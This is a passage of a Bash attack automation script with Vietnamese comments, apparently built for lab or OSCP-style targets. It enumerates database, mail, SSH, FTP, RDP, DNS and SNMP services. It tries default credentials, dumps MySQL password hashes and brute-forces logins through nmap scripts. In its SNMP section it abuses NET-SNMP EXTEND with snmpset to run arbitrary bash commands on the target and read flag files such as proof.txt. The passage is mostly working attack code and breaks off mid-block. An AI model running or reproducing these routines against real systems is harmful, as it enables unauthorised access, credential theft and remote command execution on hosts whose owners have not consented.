        # Kiểm tra xem có login được không
        if grep -q "completed" "$OUTPUT_DIR/mssql_scans/creds_${username}_${password}.txt"; then
            echo "[!] Credentials working: $username / $password"
            save_vulnerability "1433" "MSSQL" "Weak MSSQL Credentials: $username / $password" "Critical" "The MSSQL server allows login with weak credentials ($username:$password), which could allow unauthorized database access." ""
        fi
    done
    
    # Check for MSSQL vulnerabilities
    if grep -q "sa:sa" "$OUTPUT_DIR/mssql_scans/nmap_mssql.nmap"; then
        save_vulnerability "1433" "MSSQL" "Default SA Password" "Critical" "The MSSQL server is using the default 'sa' account with password 'sa', which allows full administrative access to the database." ""
    fi
    
    if grep -q "xp_cmdshell" "$OUTPUT_DIR/mssql_scans/nmap_mssql.nmap"; then
        save_vulnerability "1433" "MSSQL" "xp_cmdshell Enabled" "Critical" "The xp_cmdshell extended stored procedure is enabled, which allows for command execution on the operating system." ""
    fi
fi

# Check for MySQL service
if echo "$OPEN_PORTS" | grep -q "3306"; then
    echo "[+] MySQL service detected, running advanced MySQL enumeration..."
    
    # Create directory for MySQL scans
    mkdir -p "$OUTPUT_DIR/mysql_scans"
    
    # Enhanced MySQL version detection
    echo "[+] Performing detailed MySQL version detection..."
    nmap -p 3306 --script mysql-info $TARGET -oN "$OUTPUT_DIR/mysql_scans/mysql_version.txt"
    
    # MySQL enumeration and vulnerability scanning
    nmap -p 3306 --script mysql-info,mysql-empty-password,mysql-users,mysql-brute,mysql-variables,mysql-audit,mysql-enum,mysql-dump-hashes --script-args="mysql-audit.filename='/usr/share/nmap/nselib/data/mysql-cis.audit'" -oA "$OUTPUT_DIR/mysql_scans/nmap_mysql" $TARGET
    
    # Thử nhiều username/password phổ biến
    echo "[+] Testing common MySQL credentials..."
    mysql_creds=("root:" "root:root" "root:password" "root:mysql" "admin:admin" "mysql:mysql")
    
    for cred in "${mysql_creds[@]}"; do
        username=$(echo $cred | cut -d':' -f1)
        password=$(echo $cred | cut -d':' -f2)
        
        echo "[+] Trying credentials: $username / $password"
        mysql -h $TARGET -u $username --password="$password" -e "SHOW DATABASES;" > "$OUTPUT_DIR/mysql_scans/mysql_${username}_${password}.txt" 2>/dev/null
        
        # Kiểm tra xem có login được không
        if [ -s "$OUTPUT_DIR/mysql_scans/mysql_${username}_${password}.txt" ]; then
            echo "[!] Credentials working: $username / $password"
            save_vulnerability "3306" "MySQL" "Weak MySQL Credentials: $username / $password" "Critical" "The MySQL server allows login with weak credentials ($username:$password), which could allow unauthorized database access." ""
            
            # Nếu login được, lấy thêm thông tin
            mysql -h $TARGET -u $username --password="$password" -e "SHOW DATABASES; SELECT user,host,authentication_string FROM mysql.user;" > "$OUTPUT_DIR/mysql_scans/mysql_${username}_${password}_details.txt" 2>/dev/null
        fi
    done
    
    # Check for MySQL vulnerabilities
    if grep -q "Accounts that have no password" "$OUTPUT_DIR/mysql_scans/nmap_mysql.nmap"; then
        save_vulnerability "3306" "MySQL" "MySQL Empty Password" "Critical" "One or more MySQL accounts have empty passwords, allowing unauthorized access to the database." ""
    fi
fi

# Check for SMTP service
if echo "$OPEN_PORTS" | grep -q "25\|465\|587"; then
    echo "[+] SMTP service detected, running advanced SMTP enumeration..."
    
    # Create directory for SMTP scans
    mkdir -p "$OUTPUT_DIR/smtp_scans"
    
    # Enhanced SMTP version detection
    echo "[+] Performing detailed SMTP version detection..."
    nmap -p 25,465,587 --script smtp-commands $TARGET -oN "$OUTPUT_DIR/smtp_scans/smtp_version.txt"
    
    # SMTP enumeration and vulnerability scanning
    nmap -p 25,465,587 --script smtp-commands,smtp-enum-users,smtp-open-relay,smtp-vuln* -oA "$OUTPUT_DIR/smtp_scans/nmap_smtp" $TARGET
    
    # Check for SMTP vulnerabilities
    if grep -q "Server is an open relay" "$OUTPUT_DIR/smtp_scans/nmap_smtp.nmap"; then
        save_vulnerability "25" "SMTP" "Open Mail Relay" "High" "The SMTP server is configured as an open relay, which allows unauthorized users to send emails through it." ""
    fi
    
    # Try SMTP user enumeration with expanded list of users
    mkdir -p "$OUTPUT_DIR/smtp_scans/users"
    common_users="root admin administrator postmaster webmaster mail www info security hostmaster support contact abuse noc help test"
    for user in $common_users; do
        echo "VRFY $user" | nc -n -C $TARGET 25 | grep -v "^220\|^502" > "$OUTPUT_DIR/smtp_scans/users/${user}.txt" 2>/dev/null
        echo "EXPN $user" | nc -n -C $TARGET 25 | grep -v "^220\|^502" >> "$OUTPUT_DIR/smtp_scans/users/${user}_expn.txt" 2>/dev/null
        echo "RCPT TO:<$user@$TARGET>" | nc -n -C -w 3 $TARGET 25 | grep -v "^220\|^502" >> "$OUTPUT_DIR/smtp_scans/users/${user}_rcpt.txt" 2>/dev/null
    done
    
    # Combine valid users
    grep -l "^2[0-9][0-9]" "$OUTPUT_DIR/smtp_scans/users/"* | xargs cat > "$OUTPUT_DIR/smtp_scans/valid_users.txt" 2>/dev/null
    
    if [ -s "$OUTPUT_DIR/smtp_scans/valid_users.txt" ]; then
        save_vulnerability "25" "SMTP" "User Enumeration Possible" "Medium" "The SMTP server allows user enumeration using VRFY/EXPN commands, revealing valid user accounts." ""
    fi
    
    # Test for SMTP spoofing
    echo "[+] Testing for SMTP spoofing..."
    (
    sleep 1
    echo "HELO test.com"
    sleep 1
    echo "MAIL FROM: <admin@test.com>"
    sleep 1
    echo "RCPT TO: <root@localhost>"
    sleep 1
    echo "DATA"
    sleep 1
    echo "Subject: SMTP Spoofing Test"
    echo "This is a test for SMTP spoofing vulnerability."
    echo "."
    sleep 1
    echo "QUIT"
    ) | nc -w 10 $TARGET 25 > "$OUTPUT_DIR/smtp_scans/smtp_spoofing_test.txt" 2>/dev/null
    
    # Check if spoofing might be possible
    if grep -q "250 " "$OUTPUT_DIR/smtp_scans/smtp_spoofing_test.txt" && ! grep -q "5[0-9][0-9] " "$OUTPUT_DIR/smtp_scans/smtp_spoofing_test.txt"; then
        save_vulnerability "25" "SMTP" "Potential SMTP Spoofing" "Medium" "The SMTP server might allow email spoofing by accepting emails from arbitrary sender addresses." ""
    fi
fi

# Check for SSH service
if echo "$OPEN_PORTS" | grep -q "22"; then
    echo "[+] SSH service detected, running advanced SSH enumeration..."
    
    # Create directory for SSH scans
    mkdir -p "$OUTPUT_DIR/ssh_scans"
    
    # Enhanced SSH version detection
    echo "[+] Performing detailed SSH version detection..."
    nmap -p 22 -sV --version-intensity 9 $TARGET -oN "$OUTPUT_DIR/ssh_scans/ssh_version.txt"
    
    # SSH enumeration and vulnerability scanning
    nmap -p 22 --script ssh-auth-methods,ssh-hostkey,ssh-brute,ssh-publickey-acceptance,sshv1 $TARGET -oA "$OUTPUT_DIR/ssh_scans/nmap_ssh"
    
    # Check for SSH vulnerabilities
    if grep -q "Valid credentials" "$OUTPUT_DIR/ssh_scans/nmap_ssh.nmap"; then
        save_vulnerability "22" "SSH" "Weak SSH Credentials" "High" "SSH server has one or more accounts with weak or default credentials." ""
    fi
    
    if grep -q "SSHv1 supported" "$OUTPUT_DIR/ssh_scans/nmap_ssh.nmap"; then
        save_vulnerability "22" "SSH" "SSHv1 Protocol Support" "High" "SSH server supports the obsolete and insecure SSHv1 protocol." ""
    fi
    
    # Additional SSH checks
    echo "[+] Checking SSH algorithms..."
    nmap -p 22 --script ssh2-enum-algos $TARGET -oN "$OUTPUT_DIR/ssh_scans/ssh_algorithms.txt"
    
    # Check for weak algorithms
    if grep -q "arcfour\|blowfish\|3des\|diffie-hellman-group1\|diffie-hellman-group-exchange-sha1" "$OUTPUT_DIR/ssh_scans/ssh_algorithms.txt"; then
        save_vulnerability "22" "SSH" "Weak SSH Algorithms" "Medium" "SSH server supports weak cryptographic algorithms that may be susceptible to attacks." ""
    fi
    
    # Kiểm tra User Enumeration via SSH
    echo "[+] Checking for SSH user enumeration vulnerability..."
    mkdir -p "$OUTPUT_DIR/ssh_scans/user_enum"
    
    # Tạo danh sách user phổ biến để kiểm tra
    common_users="root admin administrator user guest test dev"
    
    for user in $common_users; do
        # Đo thời gian phản hồi
        start_time=$(date +%s%N)
        ssh -o BatchMode=yes -o ConnectTimeout=5 -o StrictHostKeyChecking=no $user@$TARGET 2>&1 | grep -v "Connection timed out" > "$OUTPUT_DIR/ssh_scans/user_enum/${user}.txt"
        end_time=$(date +%s%N)
        response_time=$(( ($end_time - $start_time) / 1000000 ))
        
        echo "$user: $response_time ms" >> "$OUTPUT_DIR/ssh_scans/user_enum/response_times.txt"
        
        # Nếu đăng nhập sai mật khẩu nhưng user tồn tại, thời gian phản hồi sẽ khác
        if grep -q "Permission denied" "$OUTPUT_DIR/ssh_scans/user_enum/${user}.txt"; then
            echo "[!] User likely exists: $user (response time: $response_time ms)"
            echo "$user" >> "$OUTPUT_DIR/ssh_scans/user_enum/likely_users.txt"
        fi
    done
    
    # Kiểm tra nếu có khả năng user enumeration
    if [ -f "$OUTPUT_DIR/ssh_scans/user_enum/likely_users.txt" ] && [ -s "$OUTPUT_DIR/ssh_scans/user_enum/likely_users.txt" ]; then
        save_vulnerability "22" "SSH" "SSH User Enumeration" "Medium" "The SSH server may leak information about valid user accounts through timing differences in responses." ""
    fi
fi

# Check for FTP service
if echo "$OPEN_PORTS" | grep -q "21"; then
    echo "[+] FTP service detected, running advanced FTP enumeration..."
    
    # Create directory for FTP scans
    mkdir -p "$OUTPUT_DIR/ftp_scans"
    
    # Enhanced FTP version detection
    echo "[+] Performing detailed FTP version detection..."
    nmap -p 21 -sV --version-intensity 9 $TARGET -oN "$OUTPUT_DIR/ftp_scans/ftp_version.txt"
    
    # FTP enumeration and vulnerability scanning
    nmap -p 21 --script ftp-anon,ftp-bounce,ftp-brute,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor $TARGET -oA "$OUTPUT_DIR/ftp_scans/nmap_ftp"
    
    # Try anonymous login
    echo "[+] Trying anonymous FTP login..."
    mkdir -p "$OUTPUT_DIR/ftp_scans/anonymous"
    
    # Use curl for FTP anonymous check
    curl -s --connect-timeout 5 --max-time 10 "ftp://$TARGET/" --user "anonymous:anonymous" -o "$OUTPUT_DIR/ftp_scans/anonymous/listing.txt"
    
    # Use netcat for raw FTP commands
    echo -e "USER anonymous\r\nPASS anonymous\r\nPWD\r\nLIST\r\nQUIT\r\n" | nc -w 5 $TARGET 21 > "$OUTPUT_DIR/ftp_scans/anonymous/raw_session.txt" 2>/dev/null
    
    # Check if anonymous login is allowed
    if grep -q "230" "$OUTPUT_DIR/ftp_scans/anonymous/raw_session.txt"; then
        echo "[!] Anonymous FTP login allowed"
        save_vulnerability "21" "FTP" "Anonymous FTP Access" "Medium" "The FTP server allows anonymous login, which could expose sensitive files." ""
        
        # Kiểm tra các đường dẫn đáng ngờ
        echo "[+] Checking for interesting files and directories via FTP..."
        interesting_paths="backup admin passwd config .config .git .svn backup old archive database users home private etc bin data tmp temp www"
        
        for path in $interesting_paths; do
            echo -e "USER anonymous\r\nPASS anonymous\r\nCWD $path\r\nPWD\r\nLIST\r\nQUIT\r\n" | nc -w 5 $TARGET 21 > "$OUTPUT_DIR/ftp_scans/anonymous/path_${path}.txt" 2>/dev/null
            
            # Kiểm tra xem thư mục có tồn tại không
            if grep -q "250 CWD" "$OUTPUT_DIR/ftp_scans/anonymous/path_${path}.txt"; then
                echo "[!] Found accessible directory: $path"
                save_vulnerability "21" "FTP" "Sensitive FTP Directory: $path" "High" "The FTP server allows anonymous access to potentially sensitive directory: $path" ""
            fi
        done
    fi
    
    # Check for common vulnerabilities
    if grep -q "vsftpd 2.3.4" "$OUTPUT_DIR/ftp_scans/nmap_ftp.nmap"; then
        save_vulnerability "21" "FTP" "vsFTPd Backdoor" "Critical" "The FTP server is running vsftpd 2.3.4 which contains a backdoor that could allow remote code execution." "CVE-2011-2523"
    fi
    
    if grep -q "ProFTPD 1.3.3" "$OUTPUT_DIR/ftp_scans/nmap_ftp.nmap"; then
        save_vulnerability "21" "FTP" "ProFTPD Backdoor" "Critical" "The FTP server is running ProFTPD 1.3.3 which may contain a backdoor that could allow remote code execution." "CVE-2010-4221"
    fi
    
    # Check for FTP bounce vulnerability
    if grep -q "Bounce attack" "$OUTPUT_DIR/ftp_scans/nmap_ftp.nmap"; then
        save_vulnerability "21" "FTP" "FTP Bounce Attack" "High" "The FTP server is vulnerable to bounce attacks, which can be used for port scanning behind firewalls." ""
    fi
    
    # Kiểm tra phiên bản ProFTPD có lỗ hổng mod_copy
    if grep -q "ProFTPD 1.3.[1-5]" "$OUTPUT_DIR/ftp_scans/ftp_version.txt"; then
        save_vulnerability "21" "FTP" "ProFTPD mod_copy Vulnerability" "High" "The ProFTPD server may be vulnerable to the mod_copy module vulnerability that allows site-to-site copying without authentication." "CVE-2015-3306"
    fi
fi

# Check for RDP service
if echo "$OPEN_PORTS" | grep -q "3389"; then
    echo "[+] RDP service detected, running advanced RDP enumeration..."
    
    # Create directory for RDP scans
    mkdir -p "$OUTPUT_DIR/rdp_scans"
    
    # Enhanced RDP version detection
    echo "[+] Performing detailed RDP version detection..."
    nmap -p 3389 -sV --version-intensity 9 $TARGET -oN "$OUTPUT_DIR/rdp_scans/rdp_version.txt"
    
    # RDP enumeration and vulnerability scanning
    nmap -p 3389 --script rdp-ntlm-info,rdp-enum-encryption,rdp-vuln-ms12-020 $TARGET -oA "$OUTPUT_DIR/rdp_scans/nmap_rdp"
    
    # Check for RDP vulnerabilities
    if grep -q "MS12-020" "$OUTPUT_DIR/rdp_scans/nmap_rdp.nmap"; then
        save_vulnerability "3389" "RDP" "MS12-020 Vulnerability" "Critical" "The RDP server is vulnerable to MS12-020, which could allow remote code execution or denial of service." "CVE-2012-0002"
    fi
    
    # Check for NLA (Network Level Authentication)
    if grep -q "NLA: Disabled" "$OUTPUT_DIR/rdp_scans/nmap_rdp.nmap"; then
        save_vulnerability "3389" "RDP" "RDP without NLA" "Medium" "The RDP server does not require Network Level Authentication, making it susceptible to man-in-the-middle attacks and brute force attempts." ""
    fi
    
    # Additional RDP checks
    echo "[+] Checking RDP security settings..."
    nmap -p 3389 --script rdp-enum-encryption $TARGET -oN "$OUTPUT_DIR/rdp_scans/rdp_encryption.txt"
    
    # Check for weak encryption
    if grep -q "128-bit\|56-bit\|40-bit" "$OUTPUT_DIR/rdp_scans/rdp_encryption.txt"; then
        save_vulnerability "3389" "RDP" "Weak RDP Encryption" "Medium" "The RDP server supports weak encryption methods, which could potentially be compromised." ""
    fi
    
    # Kiểm tra lỗ hổng BlueKeep
    echo "[+] Checking for BlueKeep vulnerability (CVE-2019-0708)..."
    nmap -p 3389 --script rdp-vuln-ms12-020 $TARGET -oN "$OUTPUT_DIR/rdp_scans/bluekeep_check.txt"
    
    # Tạo script kiểm tra BlueKeep (đơn giản)
    echo "[+] Performing advanced RDP security check..."
    if grep -q -i "windows" "$OUTPUT_DIR/rdp_scans/rdp_version.txt"; then
        if grep -q -i "windows 7\|windows server 2008" "$OUTPUT_DIR/rdp_scans/rdp_version.txt"; then
            save_vulnerability "3389" "RDP" "Potential BlueKeep Vulnerability" "Critical" "The RDP server may be vulnerable to the BlueKeep vulnerability (CVE-2019-0708), which allows remote code execution without authentication." "CVE-2019-0708"
        fi
    fi
    
    # Thử kết nối với các user phổ biến
    echo "[+] Attempting to identify RDP users..."
    mkdir -p "$OUTPUT_DIR/rdp_scans/users"
    common_users="administrator admin user guest test"
    for user in $common_users; do
        rdesktop -u $user -p test123 $TARGET:3389 2> "$OUTPUT_DIR/rdp_scans/users/${user}_attempt.txt" &
        pid=$!
        sleep 2
        kill $pid 2>/dev/null
        
        # Kiểm tra kết quả
        if grep -q "Security negotiation failure" "$OUTPUT_DIR/rdp_scans/users/${user}_attempt.txt"; then
            echo "[!] Security negotiation failed with user: $user - not helpful for enumeration"
        elif grep -q "Authentication failure" "$OUTPUT_DIR/rdp_scans/users/${user}_attempt.txt"; then
            echo "[!] Authentication failure with user: $user - user may exist"
            echo "$user" >> "$OUTPUT_DIR/rdp_scans/users/potential_users.txt"
        fi
    done
fi

# Check for DNS service
if echo "$OPEN_PORTS" | grep -q "53"; then
    echo "[+] DNS service detected, running advanced DNS enumeration..."
    
    # Create directory for DNS scans
    mkdir -p "$OUTPUT_DIR/dns_scans"
    
    # Enhanced DNS version detection
    echo "[+] Performing detailed DNS version detection..."
    nmap -p 53 -sV --version-intensity 9 $TARGET -oN "$OUTPUT_DIR/dns_scans/dns_version.txt"
    
    # DNS enumeration and vulnerability scanning
    nmap -p 53 --script dns-recursion,dns-zone-transfer,dns-cache-snoop $TARGET -oA "$OUTPUT_DIR/dns_scans/nmap_dns"
    
    # Check for DNS vulnerabilities
    if grep -q "recursion: enabled" "$OUTPUT_DIR/dns_scans/nmap_dns.nmap"; then
        save_vulnerability "53" "DNS" "DNS Recursion Enabled" "Medium" "The DNS server allows recursive queries, which may be abused for DNS amplification attacks." ""
    fi
    
    # Try zone transfer with different domain guesses
    potential_domains=("$TARGET" "$(echo $TARGET | cut -d'.' -f1)" "local" "lan" "internal" "corp" "private")
    
    for domain in "${potential_domains[@]}"; do
        echo "[+] Attempting zone transfer for: $domain"
        dig axfr @$TARGET $domain > "$OUTPUT_DIR/dns_scans/zone_transfer_${domain}.txt" 2>/dev/null
        
        # Try with common TLDs
        for tld in com net org local; do
            dig axfr @$TARGET $domain.$tld > "$OUTPUT_DIR/dns_scans/zone_transfer_${domain}_${tld}.txt" 2>/dev/null
        done
    done
    
    # Tổng hợp các zone transfer thành công
    cat "$OUTPUT_DIR/dns_scans/zone_transfer_"* | grep -l "XFR size" > "$OUTPUT_DIR/dns_scans/successful_zone_transfers.txt"
    
    # Check if zone transfer is successful
    if [ -s "$OUTPUT_DIR/dns_scans/successful_zone_transfers.txt" ]; then
        echo "[!] Zone transfer successful"
        save_vulnerability "53" "DNS" "Zone Transfer Allowed" "High" "The DNS server allows zone transfers, which could reveal internal network information." ""
    fi
    
    # Thử khai thác DNS cache với các domain phổ biến
    echo "[+] Testing DNS cache poisoning..."
    nmap -p 53 --script dns-cache-snoop --script-args="dns-cache-snoop.mode=nonrecursive" $TARGET -oN "$OUTPUT_DIR/dns_scans/dns_cache_snoop.txt"
    
    # Kiểm tra nếu có thể cache poisoning
    if grep -q "cached" "$OUTPUT_DIR/dns_scans/dns_cache_snoop.txt"; then
        save_vulnerability "53" "DNS" "DNS Cache Snooping" "Medium" "The DNS server is vulnerable to cache snooping, which could allow an attacker to determine what domains have been recently resolved." ""
    fi
fi

# TÍNH NĂNG MỚI: Kiểm tra SNMP (UDP 161)
if echo "$OPEN_PORTS" | grep -q "161" || grep -q "161/udp.*open" "$OUTPUT_DIR/nmap_udp.nmap"; then
    echo "[+] SNMP service detected, running advanced SNMP enumeration..."
    
    # Create directory for SNMP scans
    mkdir -p "$OUTPUT_DIR/snmp_scans"
    
    # Thử kết nối với community string mặc định
    echo "[+] Testing default SNMP community strings..."
    
    # Sử dụng onesixtyone để kiểm tra community string phổ biến
    echo "public\nprivate\nmanager\nadmin\nnetwork" > "$OUTPUT_DIR/snmp_scans/community_strings.txt"
    onesixtyone -i $TARGET -c "$OUTPUT_DIR/snmp_scans/community_strings.txt" > "$OUTPUT_DIR/snmp_scans/onesixtyone_results.txt"
    
    # Kiểm tra kết quả
    if grep -q "[" "$OUTPUT_DIR/snmp_scans/onesixtyone_results.txt"; then
        echo "[!] Found valid SNMP community strings!"
        grep "\[" "$OUTPUT_DIR/snmp_scans/onesixtyone_results.txt" | awk '{print $2}' > "$OUTPUT_DIR/snmp_scans/valid_community_strings.txt"
        
        # Lưu lỗ hổng
        save_vulnerability "161" "SNMP" "Default SNMP Community Strings" "High" "The SNMP server is using default or easily guessable community strings, which could allow unauthorized access to device information." ""
        
        # Sử dụng snmpwalk để thu thập thông tin với community string hợp lệ
        while read -r community; do
            echo "[+] Gathering information with community string: $community"
            
            # System information
            snmpwalk -v1 -c $community $TARGET 1.3.6.1.2.1.1 > "$OUTPUT_DIR/snmp_scans/system_info_${community}.txt" 2>/dev/null
            
            # Interfaces
            snmpwalk -v1 -c $community $TARGET 1.3.6.1.2.1.2 > "$OUTPUT_DIR/snmp_scans/interfaces_${community}.txt" 2>/dev/null
            
            # Network information
            snmpwalk -v1 -c $community $TARGET 1.3.6.1.2.1.4 > "$OUTPUT_DIR/snmp_scans/network_${community}.txt" 2>/dev/null
            
            # Running processes
            snmpwalk -v1 -c $community $TARGET 1.3.6.1.2.1.25.4.2.1.2 > "$OUTPUT_DIR/snmp_scans/processes_${community}.txt" 2>/dev/null
            
            # Installed software
            snmpwalk -v1 -c $community $TARGET 1.3.6.1.2.1.25.6.3.1.2 > "$OUTPUT_DIR/snmp_scans/software_${community}.txt" 2>/dev/null
            
            # User accounts
            snmpwalk -v1 -c $community $TARGET 1.3.6.1.4.1.77.1.2.25 > "$OUTPUT_DIR/snmp_scans/users_${community}.txt" 2>/dev/null
            
            # Extract usernames
            if [ -s "$OUTPUT_DIR/snmp_scans/users_${community}.txt" ]; then
                grep -oP '(?<=STRING: )[^"]*' "$OUTPUT_DIR/snmp_scans/users_${community}.txt" > "$OUTPUT_DIR/snmp_scans/usernames.txt"
                echo "[!] Found user accounts via SNMP!"
                save_vulnerability "161" "SNMP" "User Information Disclosure" "High" "The SNMP server is revealing user account information via SNMP queries with community string '$community'." ""
            fi
            
            # TÍNH NĂNG MỚI: Kiểm tra hệ điều hành để xác định phương thức đọc file
            echo "[+] Checking system type to determine file reading method..."
            system_type=$(grep -i "linux\|ubuntu\|debian\|centos\|fedora\|redhat" "$OUTPUT_DIR/snmp_scans/system_info_${community}.txt")
            
            if [ -n "$system_type" ]; then
                echo "[+] Detected Linux-based system. Attempting to read files via SNMP..."
                
                # TÍNH NĂNG MỚI: Thử đọc file sử dụng phương thức EXTEND (NET-SNMP)
                echo "[+] Testing if NET-SNMP EXTEND is supported..."
                if snmpwalk -v1 -c $community $TARGET .1.3.6.1.4.1.8072.1.3.2 &>/dev/null; then
                    echo "[+] NET-SNMP EXTEND appears to be supported."
                    
                    # Thử tìm file local.txt trước
                    echo "[+] Attempting to locate and read local.txt..."
                    # Thiết lập lệnh để tìm file local.txt
                    snmpset -v1 -c $community $TARGET \
                      .1.3.6.1.4.1.8072.1.3.2.2.1.2.99 s "find_local" \
                      .1.3.6.1.4.1.8072.1.3.2.2.1.3.99 s "/bin/bash" \
                      .1.3.6.1.4.1.8072.1.3.2.2.1.4.99 s "-c 'find /home -name local.txt 2>/dev/null | head -n 1'" \
                      .1.3.6.1.4.1.8072.1.3.2.2.1.5.99 i 5 \
                      .1.3.6.1.4.1.8072.1.3.2.2.1.6.99 i 1 &>/dev/null
                    
                    # Lấy đường dẫn file local.txt
                    local_path=$(snmpwalk -v1 -c $community $TARGET .1.3.6.1.4.1.8072.1.3.2.3.1.2.99 2>/dev/null | sed 's/.*STRING: //')
                    
                    if [ -n "$local_path" ] && [ "$local_path" != "No Such Object" ]; then
                        echo "[+] Found local.txt at: $local_path"
                        
                        # Đọc nội dung file local.txt
                        echo "[+] Reading local.txt file content..."
                        snmpset -v1 -c $community $TARGET \
                          .1.3.6.1.4.1.8072.1.3.2.2.1.2.101 s "read_local" \
                          .1.3.6.1.4.1.8072.1.3.2.2.1.3.101 s "/bin/bash" \
                          .1.3.6.1.4.1.8072.1.3.2.2.1.4.101 s "-c 'cat $local_path 2>/dev/null'" \
                          .1.3.6.1.4.1.8072.1.3.2.2.1.5.101 i 5 \
                          .1.3.6.1.4.1.8072.1.3.2.2.1.6.101 i 1 &>/dev/null
                        
                        # Lấy nội dung file
                        local_content=$(snmpwalk -v1 -c $community $TARGET .1.3.6.1.4.1.8072.1.3.2.3.1.2.101 2>/dev/null | sed 's/.*STRING: //')
                        
                        if [ -n "$local_content" ]; then
                            echo "[!] Successfully read local.txt: $local_content"
                            echo "$local_content" > "$OUTPUT_DIR/snmp_scans/local_txt_content.txt"
                            save_vulnerability "161" "SNMP" "File Read: local.txt" "Critical" "SNMP allowed reading of local.txt file with content: $local_content" ""
                        else
                            echo "[-] Failed to read local.txt content"
                        fi
                    else
                        echo "[-] Could not find local.txt in /home, trying broader search..."
                        
                        # Tìm kiếm rộng hơn
                        snmpset -v1 -c $community $TARGET \
                          .1.3.6.1.4.1.8072.1.3.2.2.1.2.102 s "find_local_broad" \
                          .1.3.6.1.4.1.8072.1.3.2.2.1.3.102 s "/bin/bash" \
                          .1.3.6.1.4.1.8072.1.3.2.2.1.4.102 s "-c 'find / -name local.txt -type f 2>/dev/null | head -n 1'" \
                          .1.3.6.1.4.1.8072.1.3.2.2.1.5.102 i 5 \
                          .1.3.6.1.4.1.8072.1.3.2.2.1.6.102 i 1 &>/dev/null
                        
                        local_path=$(snmpwalk -v1 -c $community $TARGET .1.3.6.1.4.1.8072.1.3.2.3.1.2.102 2>/dev/null | sed 's/.*STRING: //')
                        
                        if [ -n "$local_path" ] && [ "$local_path" != "No Such Object" ]; then
                            echo "[+] Found local.txt at: $local_path"
                            
                            # Đọc nội dung file local.txt
                            echo "[+] Reading local.txt file content..."
                            snmpset -v1 -c $community $TARGET \
                              .1.3.6.1.4.1.8072.1.3.2.2.1.2.103 s "read_local_alt" \
                              .1.3.6.1.4.1.8072.1.3.2.2.1.3.103 s "/bin/bash" \
                              .1.3.6.1.4.1.8072.1.3.2.2.1.4.103 s "-c 'cat $local_path 2>/dev/null'" \
                              .1.3.6.1.4.1.8072.1.3.2.2.1.5.103 i 5 \
                              .1.3.6.1.4.1.8072.1.3.2.2.1.6.103 i 1 &>/dev/null
                            
                            # Lấy nội dung file
                            local_content=$(snmpwalk -v1 -c $community $TARGET .1.3.6.1.4.1.8072.1.3.2.3.1.2.103 2>/dev/null | sed 's/.*STRING: //')
                            
                            if [ -n "$local_content" ]; then
                                echo "[!] Successfully read local.txt: $local_content"
                                echo "$local_content" > "$OUTPUT_DIR/snmp_scans/local_txt_content.txt"
                                save_vulnerability "161" "SNMP" "File Read: local.txt" "Critical" "SNMP allowed reading of local.txt file with content: $local_content" ""
                            else
                                echo "[-] Failed to read local.txt content"
                            fi
                        else
                            echo "[-] Could not find local.txt anywhere"
                        fi
                    fi
                    
                    # Tìm và đọc file proof.txt
                    echo "[+] Attempting to locate and read proof.txt..."
                    # Thiết lập lệnh để tìm file proof.txt trong /root
                    snmpset -v1 -c $community $TARGET \
                      .1.3.6.1.4.1.8072.1.3.2.2.1.2.104 s "find_proof" \
                      .1.3.6.1.4.1.8072.1.3.2.2.1.3.104 s "/bin/bash" \
                      .1.3.6.1.4.1.8072.1.3.2.2.1.4.104 s "-c 'find /root -name proof.txt 2>/dev/null | head -n 1'" \
                      .1.3.6.1.4.1.8072.1.3.2.2.1.5.104 i 5 \
                      .1.3.6.1.4.1.8072.1.3.2.2.1.6.104 i 1 &>/dev/null
                    
                    # Lấy đường dẫn file proof.txt
                    proof_path=$(snmpwalk -v1 -c $community $TARGET .1.3.6.1.4.1.8072.1.3.2.3.1.2.104 2>/dev/null | sed 's/.*STRING: //')
                    
                    if [ -n "$proof_path" ] && [ "$proof_path" != "No Such Object" ]; then
                        echo "[+] Found proof.txt at: $proof_path"
                        
                        # Đọc nội dung file proof.txt
                        echo "[+] Reading proof.txt file content..."
                        snmpset -v1 -c $community $TARGET \
                          .1.3.6.1.4.1.8072.1.3.2.2.1.2.105 s "read_proof" \
                          .1.3.6.1.4.1.8072.1.3.2.2.1.3.105 s "/bin/bash" \
                          .1.3.6.1.4.1.8072.1.3.2.2.1.4.105 s "-c 'cat $proof_path 2>/dev/null'" \
                          .1.3.6.1.4.1.8072.1.3.2.2.1.5.105 i 5 \
                          .1.3.6.1.4.1.8072.1.3.2.2.1.6.105 i 1 &>/dev/null
                        
                        # Lấy nội dung file
                        proof_content=$(snmpwalk -v1 -c $community $TARGET .1.3.6.1.4.1.8072.1.3.2.3.1.2.105 2>/dev/null | sed 's/.*STRING: //')
                        
                        if [ -n "$proof_content" ]; then
                            echo "[!] Successfully read proof.txt: $proof_content"
                            echo "$proof_content" > "$OUTPUT_DIR/snmp_scans/proof_txt_content.txt"
                            save_vulnerability "161" "SNMP" "File Read: proof.txt" "Critical" "SNMP allowed reading of proof.txt file with content: $proof_content" ""
                        else
                            echo "[-] Failed to read proof.txt content"
                        fi
                    else
                        echo "[-] Could not find proof.txt in /root, trying broader search..."
                        
                        # Tìm kiếm rộng hơn
                        snmpset -v1 -c $community $TARGET \
                          .1.3.6.1.4.1.8072.1.3.2.2.1.2.106 s "find_proof_broad" \
                          .1.3.6.1.4.1.8072.1.3.2.2.1.3.106 s "/bin/bash" \
                          .1.3.6.1.4.1.8072.1.3.2.2.1.4.106 s "-c 'find / -name proof.txt -type f 2>/dev/null | head -n 1'" \
                          .1.3.6.1.4.1.8072.1.3.2.2.1.5.106 i 5 \
                          .1.3.6.1.4.1.8072.1.3.2.2.1.6.106 i 1 &>/dev/null
                        
                        proof_path=$(snmpwalk -v1 -c $community $TARGET .1.3.6.1.4.1.8072.1.3.2.3.1.2.106 2>/dev/null | sed 's/.*STRING: //')
                        
                        if [ -n "$proof_path" ] && [ "$proof_path" != "No Such Object" ]; then
                            echo "[+] Found proof.txt at: $proof_path"
                            
                            # Đọc nội dung file proof.txt
                            echo "[+] Reading proof.txt file content..."
                            snmpset -v1 -c $community $TARGET \
                              .1.3.6.1.4.1.8072.1.3.2.2.1.2.107 s "read_proof_alt" \
                              .1.3.6.1.4.1.8072.1.3.2.2.1.3.107 s "/bin/bash" \
                              .1.3.6.1.4.1.8072.1.3.2.2.1.4.107 s "-c 'cat $proof_path 2>/dev/null'" \
                              .1.3.6.1.4.1.8072.1.3.2.2.1.5.107 i 5 \
                              .1.3.6.1.4.1.8072.1.3.2.2.1.6.107 i 1 &>/dev/null
                            
                            # Lấy nội dung file
